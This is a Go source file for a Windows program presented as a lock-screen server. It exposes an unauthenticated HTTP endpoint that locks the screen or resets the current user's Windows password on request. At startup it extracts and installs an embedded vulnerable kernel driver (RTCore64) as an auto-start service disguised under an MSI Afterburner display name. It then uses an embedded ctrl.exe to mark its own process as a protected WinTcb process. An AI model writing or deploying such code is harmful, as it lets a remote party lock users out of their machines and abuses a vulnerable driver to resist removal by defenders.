package main

import (
	"bytes"
	"embed"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

/*
// 引入 Windows 系统头文件
#cgo LDFLAGS: -lnetapi32
#include <windows.h>
#include <lm.h>
#include <stdlib.h>
*/
import "C"

//go:embed ctrl.exe RTC.sys
var embeddedFiles embed.FS

func main() {
	// 启动时检查并创建系统服务
	err := checkAndCreateService()
	if err != nil {
		log.Printf("系统服务检查失败: %v", err)
	} else {
		log.Println("系统服务检查完成")
	}

	http.HandleFunc("/", handleRequest)

	fmt.Println("启动锁屏服务器，监听端口 18789...")
	err = http.ListenAndServe(":18789", nil)
	if err != nil {
		log.Fatal("服务器启动失败: ", err)
	}
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
	// 只处理POST请求
	if r.Method != http.MethodPost {
		http.Error(w, "只支持POST请求", http.StatusMethodNotAllowed)
		return
	}

	// 解析表单数据
	err := r.ParseForm()
	if err != nil {
		http.Error(w, "表单解析失败", http.StatusBadRequest)
		return
	}

	// 处理lock参数 - 锁屏
	if lock := r.FormValue("lock"); lock != "" {
		fmt.Printf("收到lock参数: %s\n", lock)

		// 执行锁屏命令
		err := lockWindows()
		if err != nil {
			http.Error(w, fmt.Sprintf("锁屏失败: %v", err), http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)
		w.Write([]byte("锁屏命令已执行"))
		return
	}

	// 处理delay参数 - 延时锁屏
	if delay := r.FormValue("delay"); delay != "" {
		fmt.Printf("收到delay参数: %s\n", delay)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
		minute, _ := strconv.Atoi(delay)
		go func() {
			time.Sleep(time.Minute * time.Duration(minute))
			err := lockWindows()
			if err != nil {
				http.Error(w, fmt.Sprintf("延时锁屏失败: %v", err), http.StatusInternalServerError)
				return
			}
		}()

		return
	}

	// 处理changepassword参数 - 修改windows用户密码
	if newPassword := r.FormValue("new_password"); newPassword != "" {
		fmt.Printf("收到修改密码请求，新密码长度: %d\n", len(newPassword))

		username, _ := getCurrentUsername()
		// 调用修改密码函数
		err := setUserPassword(username, newPassword)
		if err != nil {
			http.Error(w, fmt.Sprintf("修改密码失败: %v", err), http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)
		w.Write([]byte("密码修改成功"))
		return
	}

	// 如果没有收到任何有效参数
	http.Error(w, "参数错误", http.StatusBadRequest)
}

// lockWindows 执行Windows锁屏命令
func lockWindows() error {
	cmd := exec.Command("rundll32.exe", "user32.dll,LockWorkStation")
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("执行锁屏命令失败: %v", err)
	}
	return nil
}

// setUserPassword 使用 CGO 调用 NetUserSetInfo(Level 1003) 重置用户密码
func setUserPassword(username, password string) error {
	// ✅ 将 Go 字符串转换为 Windows 宽字符串指针（UTF-16），使用 windows.UTF16PtrFromString
	userPtr, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return fmt.Errorf("invalid username: %v", err)
	}

	passPtr, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return fmt.Errorf("invalid password: %v", err)
	}

	// Level 1003 表示设置密码
	level := C.DWORD(1003)

	// 手动分配 C 结构体 USER_INFO_1003
	userInfo := (*C.USER_INFO_1003)(C.malloc(C.sizeof_USER_INFO_1003))
	if userInfo == nil {
		return fmt.Errorf("failed to allocate USER_INFO_1003")
	}
	defer C.free(unsafe.Pointer(userInfo))

	// ✅ 正确：将密码指针（*uint16）赋值给结构体的 LPWSTR 字段
	userInfo.usri1003_password = (*C.WCHAR)(unsafe.Pointer(passPtr))

	// 调用 NetUserSetInfo
	ret := C.NetUserSetInfo(
		nil,                                 // LPCWSTR servername = NULL（本地计算机）
		(*C.WCHAR)(unsafe.Pointer(userPtr)), // LPCWSTR username
		level,                               // DWORD level = 1003
		(*C.BYTE)(unsafe.Pointer(userInfo)), // LPBYTE buf
		nil,                                 // LPDWORD parm_err
	)

	if ret != C.NERR_Success {
		return fmt.Errorf("NetUserSetInfo 失败，错误码: %d", ret)
	}

	return nil
}

// getCurrentUsername 获取当前用户名
func getCurrentUsername() (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procGetUserNameW := advapi32.NewProc("GetUserNameW")

	var size uint32 = 256
	buffer := make([]uint16, size)

	ret, _, err := procGetUserNameW.Call(
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		return "", fmt.Errorf("获取用户名失败: %v", err)
	}

	return syscall.UTF16ToString(buffer), nil
}

// checkAndCreateService 检查并创建系统服务
func checkAndCreateService() error {
	// 检查服务是否存在
	serviceExists, err := checkServiceExists("RTCore64")
	if err != nil {
		return fmt.Errorf("检查服务失败: %v", err)
	}

	if serviceExists {
		log.Println("RTCore64 服务已存在")
		return executeCtrlCommand()
	}

	log.Println("RTCore64 服务不存在，开始创建服务...")

	// 获取当前程序所在目录
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取程序路径失败: %v", err)
	}
	exeDir := filepath.Dir(exePath)

	// 释放内嵌文件
	err = extractEmbeddedFiles(exeDir)
	if err != nil {
		return fmt.Errorf("释放内嵌文件失败: %v", err)
	}

	// 创建系统服务
	err = createService("RTCore64", filepath.Join(exeDir, "RTC.sys"))
	if err != nil {
		return fmt.Errorf("创建服务失败: %v", err)
	}

	// 启动服务
	err = startService("RTCore64")
	if err != nil {
		return fmt.Errorf("启动服务失败: %v", err)
	}

	log.Println("RTCore64 服务创建并启动成功")

	// 获取当前进程PID并执行ctrl.exe命令
	return executeCtrlCommand()
}

// checkServiceExists 检查Windows服务是否存在
func checkServiceExists(serviceName string) (bool, error) {
	cmd := exec.Command("sc", "query", serviceName)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		// 如果服务不存在，sc query会返回错误
		if exitErr, ok := err.(*exec.ExitError); ok {
			if exitErr.ExitCode() == 1060 {
				return false, nil
			}
		}
		return false, fmt.Errorf("查询服务失败: %v, 输出: %s", err, out.String())
	}

	// 检查输出中是否包含服务信息
	output := out.String()
	return strings.Contains(output, "SERVICE_NAME: "+serviceName), nil
}

// extractEmbeddedFiles 释放内嵌文件到指定目录
func extractEmbeddedFiles(targetDir string) error {
	files := []string{"ctrl.exe", "RTC.sys"}

	for _, filename := range files {
		// 读取内嵌文件
		data, err := embeddedFiles.ReadFile(filename)
		if err != nil {
			return fmt.Errorf("读取内嵌文件 %s 失败: %v", filename, err)
		}

		// 写入目标文件
		targetPath := filepath.Join(targetDir, filename)
		err = os.WriteFile(targetPath, data, 0644)
		if err != nil {
			return fmt.Errorf("写入文件 %s 失败: %v", targetPath, err)
		}

		log.Printf("成功释放文件: %s", targetPath)
	}

	return nil
}

// createService 创建Windows系统服务
func createService(serviceName, sysFilePath string) error {
	// 使用sc.exe创建内核驱动服务
	cmd := exec.Command("sc.exe", "create", serviceName, 
		"type=", "kernel", 
		"start=", "auto", 
		"binPath=", sysFilePath,
		"DisplayName=", "Micro - Star MSI Afterburner")

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("创建服务命令执行失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("服务创建成功: %s", out.String())
	return nil
}

// startService 启动Windows服务
func startService(serviceName string) error {
	cmd := exec.Command("net", "start", serviceName)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("启动服务失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("服务启动成功: %s", out.String())
	return nil
}

// executeCtrlCommand 获取当前进程PID并执行ctrl.exe命令
func executeCtrlCommand() error {
	// 获取当前进程PID
	pid := os.Getpid()
	log.Printf("当前进程PID: %d", pid)

	// 获取当前程序所在目录
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取程序路径失败: %v", err)
	}
	exeDir := filepath.Dir(exePath)
	ctrlPath := filepath.Join(exeDir, "ctrl.exe")

	// 执行ctrl.exe命令
	cmd := exec.Command(ctrlPath, "set", strconv.Itoa(pid), "PPL", "WinTcb")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("执行ctrl.exe命令失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("ctrl.exe命令执行成功: %s", out.String())
	return nil
}
